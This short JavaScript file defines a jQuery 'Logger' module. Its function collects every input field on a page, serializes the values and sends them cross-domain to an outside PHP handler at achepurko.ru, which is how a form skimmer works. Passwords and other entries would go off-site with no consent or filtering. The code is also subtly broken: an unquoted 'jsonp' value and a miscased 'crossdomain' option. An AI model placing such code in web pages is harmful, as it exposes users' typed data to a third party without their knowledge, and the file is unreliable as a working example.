/**
 * Created by Алексей on 14.03.2017.
 */

var Logger = (function (){

    var getAllInputs = function()
    {
        return $("input");
    }

    var saveInputValues = function(){
        var inputs = getAllInputs();
        $.ajax({
            type: "POST",
            crossdomain: true,
            dataType: jsonp,

            data: {
                inputs: inputs.serialize(),
            },
            url: "http://achepurko.ru/logger/loggerHandler.php",
            success: function(data){
                console.log("all clear");
                console.log(data);
            },
            error: function(error){
                console.log("error");
                console.log(error);
            }
        });
    }

    return {
        saveInputValues: saveInputValues,
    }

}());